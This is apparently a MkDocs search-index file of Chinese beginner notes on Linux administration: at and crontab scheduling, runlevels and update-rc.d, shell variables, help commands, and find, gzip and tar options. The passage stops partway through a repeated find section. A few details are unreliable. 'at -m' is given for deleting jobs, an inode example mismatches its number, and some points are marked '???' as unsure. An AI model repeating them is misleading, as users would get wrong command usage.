{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"\u300aLinux\u8fd0\u7ef4\u4e0eDevOps\u5b9e\u6218\u300b\u5b66\u4e60\u7b14\u8bb0","title":"\u4e3b\u9875"},{"location":"#linuxdevops","text":"","title":"\u300aLinux\u8fd0\u7ef4\u4e0eDevOps\u5b9e\u6218\u300b\u5b66\u4e60\u7b14\u8bb0"},{"location":"week01/Linux\u4efb\u52a1\u8ba1\u5212/","text":"Linux\u4efb\u52a1\u8ba1\u5212 at \u5b89\u88c5at\u5e76\u542f\u52a8atd\u670d\u52a1\uff1a $ sudo apt-get install at $ sudo service atd start \u4f7f\u7528\u65b9\u6cd5\uff1a $ at \u65f6\u95f4 at> \u5f85\u6267\u884c\u7684\u547d\u4ee4 at> <EOT> # \u6309Ctrl+d\u7ed3\u675f\uff0c\u81ea\u52a8\u51fa\u73b0<EOT> job \u4efb\u52a1\u53f7 at \u65f6\u95f4 at\u547d\u4ee4\u9700\u8981\u6307\u5b9a\u65f6\u95f4\uff0c\u65f6\u95f4\u683c\u5f0f\u8f83\u4e3a\u7075\u6d3b\uff0c\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u683c\u5f0f\uff1a midnight, noon, teatime hh:mm today, hh:mm tomorrow\u3002\u5982\uff1a14:30 today 12\u5c0f\u65f6\u5236\uff0c\u65f6\u95f4\u540e\u9762\u52a0\u4e0aam, pm\u3002\u5982\uff1a2:30 am \u65e5\u671f\u4e0e\u65f6\u95f4\u3002\u5982\uff1a14:30 2018/04/01 \u76f8\u5bf9\u8ba1\u65f6 now + \u65f6\u95f4\u6570\u91cf \u65f6\u95f4\u5355\u4f4d \uff0c\u65f6\u95f4\u5355\u4f4d\u53ef\u4ee5\u662fminutes, hours, days, weeks\u3002\u5982\uff1anow + 3 minutes \u67e5\u770b\u5f85\u6267\u884c\u4efb\u52a1\u5217\u8868\uff1a at -l \u6216 atq \u5220\u9664\u6307\u5b9a\u7684\u5f85\u6267\u884c\u4efb\u52a1\uff1a at -m \u4efb\u52a1\u53f7 \u6216 atrm \u4efb\u52a1\u53f7 batch \u7c7b\u4f3c at \uff0c\u4f46\u5728CPU\u5de5\u4f5c\u8d1f\u8f7d\u6ee1\u8db3\u4e00\u5b9a\u6761\u4ef6\u624d\u6267\u884c\u3002 crontab -e \u7f16\u8f91crontab -l \u5217\u51facrontab -r \u79fb\u9664\u6240\u6709crontab \u7279\u6b8a\u5b57\u7b26 \u610f\u4e49 * \u4efb\u4f55 , \u679a\u4e3e - \u8303\u56f4 / \u6bcf\u9694 \u542f\u52a8crontab\uff08\u9ed8\u8ba4\u662f\u542f\u52a8\u7684\uff09\uff1a sudo cron -f & % \u5728crontab\u91cc\u8981\u8f6c\u4e49 crontab\u8981\u6ce8\u610f\u73af\u5883\u53d8\u91cf\uff0c\u4f7f\u7528\u7edd\u5bf9\u8def\u5f84\u6216\u8bbe\u7f6ePATH","title":"Linux \u4efb\u52a1\u8ba1\u5212"},{"location":"week01/Linux\u4efb\u52a1\u8ba1\u5212/#linux","text":"","title":"Linux\u4efb\u52a1\u8ba1\u5212"},{"location":"week01/Linux\u4efb\u52a1\u8ba1\u5212/#at","text":"\u5b89\u88c5at\u5e76\u542f\u52a8atd\u670d\u52a1\uff1a $ sudo apt-get install at $ sudo service atd start \u4f7f\u7528\u65b9\u6cd5\uff1a $ at \u65f6\u95f4 at> \u5f85\u6267\u884c\u7684\u547d\u4ee4 at> <EOT> # \u6309Ctrl+d\u7ed3\u675f\uff0c\u81ea\u52a8\u51fa\u73b0<EOT> job \u4efb\u52a1\u53f7 at \u65f6\u95f4 at\u547d\u4ee4\u9700\u8981\u6307\u5b9a\u65f6\u95f4\uff0c\u65f6\u95f4\u683c\u5f0f\u8f83\u4e3a\u7075\u6d3b\uff0c\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u683c\u5f0f\uff1a midnight, noon, teatime hh:mm today, hh:mm tomorrow\u3002\u5982\uff1a14:30 today 12\u5c0f\u65f6\u5236\uff0c\u65f6\u95f4\u540e\u9762\u52a0\u4e0aam, pm\u3002\u5982\uff1a2:30 am \u65e5\u671f\u4e0e\u65f6\u95f4\u3002\u5982\uff1a14:30 2018/04/01 \u76f8\u5bf9\u8ba1\u65f6 now + \u65f6\u95f4\u6570\u91cf \u65f6\u95f4\u5355\u4f4d \uff0c\u65f6\u95f4\u5355\u4f4d\u53ef\u4ee5\u662fminutes, hours, days, weeks\u3002\u5982\uff1anow + 3 minutes \u67e5\u770b\u5f85\u6267\u884c\u4efb\u52a1\u5217\u8868\uff1a at -l \u6216 atq \u5220\u9664\u6307\u5b9a\u7684\u5f85\u6267\u884c\u4efb\u52a1\uff1a at -m \u4efb\u52a1\u53f7 \u6216 atrm \u4efb\u52a1\u53f7 batch \u7c7b\u4f3c at \uff0c\u4f46\u5728CPU\u5de5\u4f5c\u8d1f\u8f7d\u6ee1\u8db3\u4e00\u5b9a\u6761\u4ef6\u624d\u6267\u884c\u3002","title":"at"},{"location":"week01/Linux\u4efb\u52a1\u8ba1\u5212/#crontab","text":"-e \u7f16\u8f91crontab -l \u5217\u51facrontab -r \u79fb\u9664\u6240\u6709crontab \u7279\u6b8a\u5b57\u7b26 \u610f\u4e49 * \u4efb\u4f55 , \u679a\u4e3e - \u8303\u56f4 / \u6bcf\u9694 \u542f\u52a8crontab\uff08\u9ed8\u8ba4\u662f\u542f\u52a8\u7684\uff09\uff1a sudo cron -f & % \u5728crontab\u91cc\u8981\u8f6c\u4e49 crontab\u8981\u6ce8\u610f\u73af\u5883\u53d8\u91cf\uff0c\u4f7f\u7528\u7edd\u5bf9\u8def\u5f84\u6216\u8bbe\u7f6ePATH","title":"crontab"},{"location":"week01/Linux\u542f\u52a8\u6d41\u7a0b/","text":"Linux\u542f\u52a8\u6d41\u7a0b \u7cfb\u7edf\u521d\u59cb\u5316\u914d\u7f6e\u6587\u4ef6\u76ee\u5f55\uff1a /etc/init /etc/rcN.d /etc/init.d \u5728 /etc/rcN.d \u76ee\u5f55\u4e2d\u5b9a\u4e49\u4e86\u5404\u79cd\u8fd0\u884c\u7ea7\u522b\u7684\u8fd0\u884c\u670d\u52a1\u3002K\u5f00\u5934\u7684\u662f\u7cfb\u7edf\u5c06\u7ec8\u6b62\u5bf9\u5e94\u7684\u670d\u52a1\uff0cS\u5f00\u7684\u662f\u7cfb\u7edf\u5c06\u542f\u52a8\u5bf9\u5e94\u7684\u670d\u52a1\u3002S\u6216K\u540e\u9762\u7684\u6570\u5b57\u65f6\u7a0b\u5e8f\u4f18\u5148\u7ea7\uff0c\u6570\u503c\u8d8a\u5c0f\u4f18\u5148\u7ea7\u8d8a\u9ad8\uff0c\u6570\u5b57\u540e\u9762\u662f\u670d\u52a1\u540d\u79f0\u3002 \u7ea7\u522b \u529f\u80fd 0 \u5173\u95ed\u7cfb\u7edf 1 \u5355\u7528\u6237\u6a21\u5f0f 2/3/4/5 \u591a\u7528\u6237\u6a21\u5f0f 6 \u91cd\u542f\u7cfb\u7edf S \u5355\u7528\u6237\u6a21\u5f0f\uff0c\u6587\u672c\u767b\u5f55\u754c\u9762\uff0c\u53ea\u8fd0\u884c\u5f88\u5c11\u51e0\u9879\u7cfb\u7edf\u670d\u52a1 \u81ea\u542f\u52a8\u670d\u52a1\u7ba1\u7406\u5de5\u5177\uff1a sysv-rc-conf \u4f7f\u7528 update-rc.d \u547d\u4ee4\u4fee\u6539\u81ea\u542f\u52a8\uff1a # \u6dfb\u52a0MySQL\u81ea\u542f\u52a8\uff08\u4f7f\u7528\u9ed8\u8ba4\u8bbe\u7f6e\uff09 $ sudo update-rc.d mysql defaults # \u68c0\u67e5MySQL\u81ea\u542f\u52a8\u60c5\u51b5 $ ll /etc/rc?.d/*mysql # \u79fb\u9664MySQL\u81ea\u542f\u52a8 $ sudo update-rc.d -f mysql remove # \u8bbe\u7f6eMySQL\u57282 3 4\u7ea7\u522b\u81ea\u542f\u52a8\uff0c0 1 5 6\u7ea7\u522b\u4e0d\u81ea\u542f\u52a8\uff0c\u4f18\u5148\u7ea7\u4e3a50 $ sudo update-rc.d mysql start 50 2 3 4 . stop 50 0 1 5 6 .","title":"Linux \u542f\u52a8\u6d41\u7a0b"},{"location":"week01/Linux\u542f\u52a8\u6d41\u7a0b/#linux","text":"\u7cfb\u7edf\u521d\u59cb\u5316\u914d\u7f6e\u6587\u4ef6\u76ee\u5f55\uff1a /etc/init /etc/rcN.d /etc/init.d \u5728 /etc/rcN.d \u76ee\u5f55\u4e2d\u5b9a\u4e49\u4e86\u5404\u79cd\u8fd0\u884c\u7ea7\u522b\u7684\u8fd0\u884c\u670d\u52a1\u3002K\u5f00\u5934\u7684\u662f\u7cfb\u7edf\u5c06\u7ec8\u6b62\u5bf9\u5e94\u7684\u670d\u52a1\uff0cS\u5f00\u7684\u662f\u7cfb\u7edf\u5c06\u542f\u52a8\u5bf9\u5e94\u7684\u670d\u52a1\u3002S\u6216K\u540e\u9762\u7684\u6570\u5b57\u65f6\u7a0b\u5e8f\u4f18\u5148\u7ea7\uff0c\u6570\u503c\u8d8a\u5c0f\u4f18\u5148\u7ea7\u8d8a\u9ad8\uff0c\u6570\u5b57\u540e\u9762\u662f\u670d\u52a1\u540d\u79f0\u3002 \u7ea7\u522b \u529f\u80fd 0 \u5173\u95ed\u7cfb\u7edf 1 \u5355\u7528\u6237\u6a21\u5f0f 2/3/4/5 \u591a\u7528\u6237\u6a21\u5f0f 6 \u91cd\u542f\u7cfb\u7edf S \u5355\u7528\u6237\u6a21\u5f0f\uff0c\u6587\u672c\u767b\u5f55\u754c\u9762\uff0c\u53ea\u8fd0\u884c\u5f88\u5c11\u51e0\u9879\u7cfb\u7edf\u670d\u52a1 \u81ea\u542f\u52a8\u670d\u52a1\u7ba1\u7406\u5de5\u5177\uff1a sysv-rc-conf \u4f7f\u7528 update-rc.d \u547d\u4ee4\u4fee\u6539\u81ea\u542f\u52a8\uff1a # \u6dfb\u52a0MySQL\u81ea\u542f\u52a8\uff08\u4f7f\u7528\u9ed8\u8ba4\u8bbe\u7f6e\uff09 $ sudo update-rc.d mysql defaults # \u68c0\u67e5MySQL\u81ea\u542f\u52a8\u60c5\u51b5 $ ll /etc/rc?.d/*mysql # \u79fb\u9664MySQL\u81ea\u542f\u52a8 $ sudo update-rc.d -f mysql remove # \u8bbe\u7f6eMySQL\u57282 3 4\u7ea7\u522b\u81ea\u542f\u52a8\uff0c0 1 5 6\u7ea7\u522b\u4e0d\u81ea\u542f\u52a8\uff0c\u4f18\u5148\u7ea7\u4e3a50 $ sudo update-rc.d mysql start 50 2 3 4 . stop 50 0 1 5 6 .","title":"Linux\u542f\u52a8\u6d41\u7a0b"},{"location":"week01/Linux\u57fa\u672c\u64cd\u4f5c/","text":"Linux\u57fa\u672c\u64cd\u4f5c \u4f7f\u7528 cat /etc/shells \u53ef\u4ee5\u67e5\u770b\u4e3b\u673a\u4e0a\u7684shell Shell\u5feb\u6377\u952e\uff1a \u5feb\u6377\u952e \u8bf4\u660e Ctrl+s \u6682\u505c\u5f53\u524d\u7a0b\u5e8f\uff0c\u6682\u505c\u540e\u6309\u4e0b\u4efb\u610f\u952e\u6062\u590d\u8fd0\u884c Ctrl+a \u5149\u6807\u79fb\u81f3\u884c\u9996(Home) Ctrl+e \u5149\u6807\u79fb\u81f3\u884c\u5c3e(End) Ctrl+l \u6e05\u5c4f ~/.profile \uff1a\u7528\u6237\u767b\u5f55\u65f6\u6267\u884c\u4e00\u6b21 ~/.bashrc \uff1a\u6bcf\u5f00\u4e2aBash\u65f6\u6267\u884c export \u663e\u793a\u4eceShell\u4e2d\u5bfc\u51fa\u6210\u73af\u5883\u53d8\u91cf\u7684\u53d8\u91cf env \u663e\u793a\u5f53\u524d\u7528\u6237\u7684\u73af\u5883\u53d8\u91cf\uff0c\u8fd8\u53ef\u4ee5\u8ba9\u547d\u4ee4\u5728\u6307\u5b9a\u73af\u5883\u4e2d\u8fd0\u884c set \u663e\u793a\u5f53\u524dShell\u6240\u6709\u53d8\u91cf\uff0c\u5305\u62ec\u5176\u5167\u5efa\u73af\u5883\u53d8\u91cf \u4fee\u6539\u73af\u5883\u53d8\u91cf\uff1a \u53d8\u91cf\u8bbe\u7f6e\u65b9\u5f0f \u8bf4\u660e ${\u53d8\u91cf\u540d#\u5339\u914d\u5b57\u4e32} \u4ece\u5934\u5411\u540e\u5339\u914d\uff0c\u5220\u9664\u7b26\u5408\u5339\u914d\u5b57\u4e32\u7684\u6700\u77ed\u6570\u636e ${\u53d8\u91cf\u540d##\u5339\u914d\u5b57\u4e32} \u4ece\u5934\u5411\u540e\u5339\u914d\uff0c\u5220\u9664\u7b26\u5408\u5339\u914d\u5b57\u4e32\u7684\u6700\u957f\u6570\u636e ${\u53d8\u91cf\u540d%\u5339\u914d\u5b57\u4e32} \u4ece\u5c3e\u5411\u524d\u5339\u914d\uff0c\u5220\u9664\u7b26\u5408\u5339\u914d\u5b57\u4e32\u7684\u6700\u77ed\u6570\u636e ${\u53d8\u91cf\u540d%%\u5339\u914d\u5b57\u4e32} \u4ece\u5c3e\u5411\u524d\u5339\u914d\uff0c\u5220\u9664\u7b26\u5408\u5339\u914d\u5b57\u4e32\u7684\u6700\u957f\u6570\u636e ${\u53d8\u91cf\u540d/\u65e7\u5b57\u4e32/\u65b0\u5b57\u4e32} \u5c06\u7b26\u5408\u65e7\u5b57\u4e32\u7684\u7b2c\u4e00\u4e2a\u5b57\u4e32\u66ff\u6362\u4e3a\u65b0\u5b57\u4e32 ${\u53d8\u91cf\u540d//\u65e7\u5b57\u4e32/\u65b0\u5b57\u4e32} \u5c06\u7b26\u5408\u65e7\u5b57\u4e32\u7684\u5168\u90e8\u5b57\u4e32\u66ff\u6362\u4e3a\u65b0\u5b57\u4e32 \u5b57\u4e32\u53ef\u4ee5\u4f7f\u7528\u901a\u914d\u7b26 unset \u53ef\u4ee5\u5220\u9664\u6307\u5b9a\u7684\u73af\u5883\u53d8\u91cf","title":"Linux \u57fa\u672c\u64cd\u4f5c"},{"location":"week01/Linux\u57fa\u672c\u64cd\u4f5c/#linux","text":"\u4f7f\u7528 cat /etc/shells \u53ef\u4ee5\u67e5\u770b\u4e3b\u673a\u4e0a\u7684shell Shell\u5feb\u6377\u952e\uff1a \u5feb\u6377\u952e \u8bf4\u660e Ctrl+s \u6682\u505c\u5f53\u524d\u7a0b\u5e8f\uff0c\u6682\u505c\u540e\u6309\u4e0b\u4efb\u610f\u952e\u6062\u590d\u8fd0\u884c Ctrl+a \u5149\u6807\u79fb\u81f3\u884c\u9996(Home) Ctrl+e \u5149\u6807\u79fb\u81f3\u884c\u5c3e(End) Ctrl+l \u6e05\u5c4f ~/.profile \uff1a\u7528\u6237\u767b\u5f55\u65f6\u6267\u884c\u4e00\u6b21 ~/.bashrc \uff1a\u6bcf\u5f00\u4e2aBash\u65f6\u6267\u884c export \u663e\u793a\u4eceShell\u4e2d\u5bfc\u51fa\u6210\u73af\u5883\u53d8\u91cf\u7684\u53d8\u91cf env \u663e\u793a\u5f53\u524d\u7528\u6237\u7684\u73af\u5883\u53d8\u91cf\uff0c\u8fd8\u53ef\u4ee5\u8ba9\u547d\u4ee4\u5728\u6307\u5b9a\u73af\u5883\u4e2d\u8fd0\u884c set \u663e\u793a\u5f53\u524dShell\u6240\u6709\u53d8\u91cf\uff0c\u5305\u62ec\u5176\u5167\u5efa\u73af\u5883\u53d8\u91cf \u4fee\u6539\u73af\u5883\u53d8\u91cf\uff1a \u53d8\u91cf\u8bbe\u7f6e\u65b9\u5f0f \u8bf4\u660e ${\u53d8\u91cf\u540d#\u5339\u914d\u5b57\u4e32} \u4ece\u5934\u5411\u540e\u5339\u914d\uff0c\u5220\u9664\u7b26\u5408\u5339\u914d\u5b57\u4e32\u7684\u6700\u77ed\u6570\u636e ${\u53d8\u91cf\u540d##\u5339\u914d\u5b57\u4e32} \u4ece\u5934\u5411\u540e\u5339\u914d\uff0c\u5220\u9664\u7b26\u5408\u5339\u914d\u5b57\u4e32\u7684\u6700\u957f\u6570\u636e ${\u53d8\u91cf\u540d%\u5339\u914d\u5b57\u4e32} \u4ece\u5c3e\u5411\u524d\u5339\u914d\uff0c\u5220\u9664\u7b26\u5408\u5339\u914d\u5b57\u4e32\u7684\u6700\u77ed\u6570\u636e ${\u53d8\u91cf\u540d%%\u5339\u914d\u5b57\u4e32} \u4ece\u5c3e\u5411\u524d\u5339\u914d\uff0c\u5220\u9664\u7b26\u5408\u5339\u914d\u5b57\u4e32\u7684\u6700\u957f\u6570\u636e ${\u53d8\u91cf\u540d/\u65e7\u5b57\u4e32/\u65b0\u5b57\u4e32} \u5c06\u7b26\u5408\u65e7\u5b57\u4e32\u7684\u7b2c\u4e00\u4e2a\u5b57\u4e32\u66ff\u6362\u4e3a\u65b0\u5b57\u4e32 ${\u53d8\u91cf\u540d//\u65e7\u5b57\u4e32/\u65b0\u5b57\u4e32} \u5c06\u7b26\u5408\u65e7\u5b57\u4e32\u7684\u5168\u90e8\u5b57\u4e32\u66ff\u6362\u4e3a\u65b0\u5b57\u4e32 \u5b57\u4e32\u53ef\u4ee5\u4f7f\u7528\u901a\u914d\u7b26 unset \u53ef\u4ee5\u5220\u9664\u6307\u5b9a\u7684\u73af\u5883\u53d8\u91cf","title":"Linux\u57fa\u672c\u64cd\u4f5c"},{"location":"week01/Linux\u5e2e\u52a9\u547d\u4ee4/","text":"Linux\u5e2e\u52a9\u547d\u4ee4 \u4f7f\u7528 type \u547d\u4ee4\u53ef\u4ee5\u533a\u5206\u547d\u4ee4\u662f\u5185\u5efa\u7684\u8fd8\u662f\u5916\u90e8\u7684\u3002 alias \u53ef\u4ee5\u4e3a\u547d\u4ee4\u8d77\u522b\u540d\uff0c\u7b80\u5316\u8f93\u5165\u3002 unalias \u522b\u540d \u53ef\u4ee5\u5220\u9664\u522b\u540d\u3002 \\\u547d\u4ee4 \u6216 '\u547d\u4ee4' \u53ef\u4ee5\u4e34\u65f6\u5ffd\u7565\u522b\u540d\u7684\u6548\u679c\u3002 help \u547d\u4ee4\u4e3abash\u5185\u5efa\u547d\u4ee4\uff0c\u53ef\u4ee5\u663e\u793ashell\u5185\u5efa\u547d\u4ee4\u7684\u5e2e\u52a9\u4fe1\u606f\u3002 man \u548c info \u53ef\u4ee5\u663e\u793a\u5e2e\u52a9\u4fe1\u606f\u3002","title":"Linux \u5e2e\u52a9\u547d\u4ee4"},{"location":"week01/Linux\u5e2e\u52a9\u547d\u4ee4/#linux","text":"\u4f7f\u7528 type \u547d\u4ee4\u53ef\u4ee5\u533a\u5206\u547d\u4ee4\u662f\u5185\u5efa\u7684\u8fd8\u662f\u5916\u90e8\u7684\u3002 alias \u53ef\u4ee5\u4e3a\u547d\u4ee4\u8d77\u522b\u540d\uff0c\u7b80\u5316\u8f93\u5165\u3002 unalias \u522b\u540d \u53ef\u4ee5\u5220\u9664\u522b\u540d\u3002 \\\u547d\u4ee4 \u6216 '\u547d\u4ee4' \u53ef\u4ee5\u4e34\u65f6\u5ffd\u7565\u522b\u540d\u7684\u6548\u679c\u3002 help \u547d\u4ee4\u4e3abash\u5185\u5efa\u547d\u4ee4\uff0c\u53ef\u4ee5\u663e\u793ashell\u5185\u5efa\u547d\u4ee4\u7684\u5e2e\u52a9\u4fe1\u606f\u3002 man \u548c info \u53ef\u4ee5\u663e\u793a\u5e2e\u52a9\u4fe1\u606f\u3002","title":"Linux\u5e2e\u52a9\u547d\u4ee4"},{"location":"week01/Linux\u6587\u4ef6\u67e5\u627e\u4e0e\u6253\u5305/","text":"Linux\u6587\u4ef6\u67e5\u627e\u4e0e\u6253\u5305 find \u547d\u4ee4\u683c\u5f0f\uff1a find \u8def\u5f84 \u53c2\u6570 \u6839\u636e\u6587\u4ef6\u5927\u5c0f\u67e5\u627e\uff1a +n \u5927\u4e8en\uff1b -n \u5c0f\u4e8en\uff1b n \u7b49\u4e8en b/c/k/w/M/G: block/\u5b57\u8282/k/\u5b57\u7b26\u6570/M/G \u6ce8\u610f\u5927\u5c0f\u5199\uff01 # \u67e5\u627e/etc\u76ee\u5f55\u4e0b\u6587\u4ef6\u5927\u5c0f\u5927\u4e8e100k\u7684\u6587\u4ef6\uff08\u6ce8\u610fk\u8981\u5c0f\u5199\uff09 $ sudo find /etc -size +100k \u6839\u636e\u65f6\u95f4\u6233\u67e5\u627e\uff1a a->access c->change m->modify -atime , -ctime , -mtime \u6839\u636e\u8bbf\u95ee\u65f6\u95f4\uff0c\u72b6\u6001\u6539\u53d8\u65f6\u95f4\uff0c\u5185\u5bb9\u4fee\u6539\u65f6\u95f4\u67e5\u627e\uff08\u5355\u4f4d\uff1a\u5929\uff1b0\u8868\u793a24\u5c0f\u65f6\u5185\uff09 -amin , -cmin , -mmin \u6839\u636ea/c/m\u7684\u5206\u949f\u6570\u67e5\u627e +n , -n , n \u5927\u4e8e\uff0c\u5c0f\u4e8e\uff0c\u7b49\u4e8en # \u67e5\u627e\u5f53\u524d\u76ee\u5f55\u4e0b\uff0c\u6587\u4ef6\u4fee\u6539\u65f6\u95f4\u57285\u5206\u949f\u523024\u5c0f\u65f6\u4e4b\u95f4\u7684\u6587\u4ef6 $ find -mtime 0 -mmin +5 -name \u6839\u636e\u6587\u4ef6\u540d\u67e5\u627e\uff0c\u53ef\u4ee5\u4f7f\u7528\u901a\u914d\u7b26\uff08\u4f7f\u7528\u901a\u914d\u7b26\u65f6\u8981\u52a0\u5f15\u53f7\uff0c\u6216\u4f7f\u7528\u8f6c\u4e49\uff09\uff1b -iname \u6839\u636e\u6587\u4ef6\u540d\u67e5\u627e\uff08\u5ffd\u7565\u5927\u5c0f\u5199\uff09 -path \u3001 -wholename \u5168\u540d\u6a21\u5f0f \uff1f\uff1f\uff1f -regex \u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d\uff0c -iregex \u5ffd\u7565\u5927\u5c0f\u5199\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d\u3002 -regextype \u6307\u5b9a\u6b63\u5219\u8868\u8fbe\u5f0f\u7c7b\u578b\uff08\u5982posix-awk\uff09 -type \u6839\u636e\u6587\u4ef6\u7c7b\u578b\u67e5\u627e\uff1b d \u76ee\u5f55\uff0c f \u666e\u901a\u6587\u4ef6\uff0c l \u7b26\u53f7\u94fe\u63a5 # \u67e5\u627e/etc\u76ee\u5f55\u4e0b\uff0c\u6587\u4ef6\u5927\u5c0f\u5927\u4e8e30k\u5e76\u4e14\u4e3a\u666e\u901a\u6587\u4ef6\u7684\u6587\u4ef6 $ sudo find /etc -type f -size +30k \u6839\u636e\u6240\u5c5e\u67e5\u627e\uff1a -user \u7528\u6237 -group \u7ec4 -uid UID -gid GID \u6839\u636e\u6743\u9650\u7b5b\u9009\uff1a -readable , -writable , -executable \u5728\u8def\u5f84\u524d\u7684\u53c2\u6570\uff1a -P \u68c0\u67e5\u7b26\u53f7\u94fe\u63a5\u672c\u8eab\uff1b -L \u68c0\u67e5\u94fe\u63a5\u6240\u6307\u5411\u7684\u6587\u4ef6\uff1b -H \u4e0d\u9075\u5faa\u7b26\u53f7\u94fe\u63a5 \uff1f\uff1f\uff1f -lname \u6839\u636e\u540d\u5b57\u67e5\u627e\u7b26\u53f7\u94fe\u63a5\uff08 -ilname \u4e0d\u533a\u5206\u5927\u5c0f\u5199\uff09 find -samefile xxx \u67e5\u627e\u5f53\u524d\u76ee\u5f55\u4e0b\u548cxx\u7684inode\u76f8\u540c\u7684\u6587\u4ef6 find -inum 1234 \u67e5\u627e\u5f53\u524d\u76ee\u5f55\u4e0binode\u53f7\u4e3a123\u7684\u6587\u4ef6 find -links n \u67e5\u627e\u5f53\u524d\u76ee\u5f55\u4e0b\u786c\u94fe\u63a5\u6570\u4e3an\u7684\u6587\u4ef6\uff08n\u4e5f\u53ef\u4ee5\u662f+n\u3001-n\uff09 locate/whereis/which locate \u547d\u4ee4\u5229\u7528\u4fdd\u5b58\u6709\u7cfb\u7edf\u4e2d\u6240\u6709\u6587\u4ef6\u540d\u548c\u76ee\u5f55\u540d\u7684\u6570\u636e\u5e93\u4e2d\u53bb\u67e5\u627e\u6765\u5b9e\u73b0\u5feb\u901f\u67e5\u627e updatedb \u66f4\u65b0\u6570\u636e\u5e93 --basename \u6839\u636e\u57fa\u7840\u540d\u79f0\u67e5\u627e whereis \u4ec5\u641c\u7d22\u4e8c\u8fdb\u5236\u6587\u4ef6\u6216man\u624b\u518c\u6587\u4ef6 which \u7528\u4e8e\u67e5\u627e\u547d\u4ee4\u7684\u5b8c\u6574\u8def\u5f84\u3002 -a \u5217\u51fa\u6240\u6709\u5339\u914d\u7684\u67e5\u627e\u7ed3\u679c \u6587\u4ef6\u6253\u5305\u548c\u89e3\u538b gzip: gzip \u6587\u4ef6 \u538b\u7f29\u6587\u4ef6\u4e3a.gz gunzip \u6587\u4ef6 \u89e3\u538b\u7f29.gz\u6587\u4ef6 -k \u538b\u7f29\u6216\u89e3\u538b\u7f29\u65f6\u4fdd\u7559\u6e90\u6587\u4ef6 -v \u663e\u793a\u5904\u7406\u8be6\u60c5 tar: -c \u521b\u5efatar -z \u6307\u5b9agzip\u683c\u5f0f -v \u663e\u793a\u5904\u7406\u8be6\u60c5 -f \u6307\u5b9a\u6587\u4ef6\u540d\u79f0 -x \u8fd8\u539ftar","title":"Linux \u6587\u4ef6\u67e5\u627e\u4e0e\u6253\u5305"},{"location":"week01/Linux\u6587\u4ef6\u67e5\u627e\u4e0e\u6253\u5305/#linux","text":"","title":"Linux\u6587\u4ef6\u67e5\u627e\u4e0e\u6253\u5305"},{"location":"week01/Linux\u6587\u4ef6\u67e5\u627e\u4e0e\u6253\u5305/#find","text":"\u547d\u4ee4\u683c\u5f0f\uff1a find \u8def\u5f84 \u53c2\u6570 \u6839\u636e\u6587\u4ef6\u5927\u5c0f\u67e5\u627e\uff1a +n \u5927\u4e8en\uff1b -n \u5c0f\u4e8en\uff1b n \u7b49\u4e8en b/c/k/w/M/G: block/\u5b57\u8282/k/\u5b57\u7b26\u6570/M/G \u6ce8\u610f\u5927\u5c0f\u5199\uff01 # \u67e5\u627e/etc\u76ee\u5f55\u4e0b\u6587\u4ef6\u5927\u5c0f\u5927\u4e8e100k\u7684\u6587\u4ef6\uff08\u6ce8\u610fk\u8981\u5c0f\u5199\uff09 $ sudo find /etc -size +100k \u6839\u636e\u65f6\u95f4\u6233\u67e5\u627e\uff1a a->access c->change m->modify -atime , -ctime , -mtime \u6839\u636e\u8bbf\u95ee\u65f6\u95f4\uff0c\u72b6\u6001\u6539\u53d8\u65f6\u95f4\uff0c\u5185\u5bb9\u4fee\u6539\u65f6\u95f4\u67e5\u627e\uff08\u5355\u4f4d\uff1a\u5929\uff1b0\u8868\u793a24\u5c0f\u65f6\u5185\uff09 -amin , -cmin , -mmin \u6839\u636ea/c/m\u7684\u5206\u949f\u6570\u67e5\u627e +n , -n , n \u5927\u4e8e\uff0c\u5c0f\u4e8e\uff0c\u7b49\u4e8en # \u67e5\u627e\u5f53\u524d\u76ee\u5f55\u4e0b\uff0c\u6587\u4ef6\u4fee\u6539\u65f6\u95f4\u57285\u5206\u949f\u523024\u5c0f\u65f6\u4e4b\u95f4\u7684\u6587\u4ef6 $ find -mtime 0 -mmin +5 -name \u6839\u636e\u6587\u4ef6\u540d\u67e5\u627e\uff0c\u53ef\u4ee5\u4f7f\u7528\u901a\u914d\u7b26\uff08\u4f7f\u7528\u901a\u914d\u7b26\u65f6\u8981\u52a0\u5f15\u53f7\uff0c\u6216\u4f7f\u7528\u8f6c\u4e49\uff09\uff1b -iname \u6839\u636e\u6587\u4ef6\u540d\u67e5\u627e\uff08\u5ffd\u7565\u5927\u5c0f\u5199\uff09 -path \u3001 -wholename \u5168\u540d\u6a21\u5f0f \uff1f\uff1f\uff1f -regex \u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d\uff0c -iregex \u5ffd\u7565\u5927\u5c0f\u5199\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d\u3002 -regextype \u6307\u5b9a\u6b63\u5219\u8868\u8fbe\u5f0f\u7c7b\u578b\uff08\u5982posix-awk\uff09 -type \u6839\u636e\u6587\u4ef6\u7c7b\u578b\u67e5\u627e\uff1b d \u76ee\u5f55\uff0c f \u666e\u901a\u6587\u4ef6\uff0c l \u7b26\u53f7\u94fe\u63a5 # \u67e5\u627e/etc\u76ee\u5f55\u4e0b\uff0c\u6587\u4ef6\u5927\u5c0f\u5927\u4e8e30k\u5e76\u4e14\u4e3a\u666e\u901a\u6587\u4ef6\u7684\u6587\u4ef6 $ sudo find /etc -type f -size +30k \u6839\u636e\u6240\u5c5e\u67e5\u627e\uff1a -user \u7528\u6237 -group \u7ec4 -uid UID -gid GID \u6839\u636e\u6743\u9650\u7b5b\u9009\uff1a -readable , -writable , -executable \u5728\u8def\u5f84\u524d\u7684\u53c2\u6570\uff1a -P \u68c0\u67e5\u7b26\u53f7\u94fe\u63a5\u672c\u8eab\uff1b -L \u68c0\u67e5\u94fe\u63a5\u6240\u6307\u5411\u7684\u6587\u4ef6\uff1b -H \u4e0d\u9075\u5faa\u7b26\u53f7\u94fe\u63a5 \uff1f\uff1f\uff1f -lname \u6839\u636e\u540d\u5b57\u67e5\u627e\u7b26\u53f7\u94fe\u63a5\uff08 -ilname \u4e0d\u533a\u5206\u5927\u5c0f\u5199\uff09 find -samefile xxx \u67e5\u627e\u5f53\u524d\u76ee\u5f55\u4e0b\u548cxx\u7684inode\u76f8\u540c\u7684\u6587\u4ef6 find -inum 1234 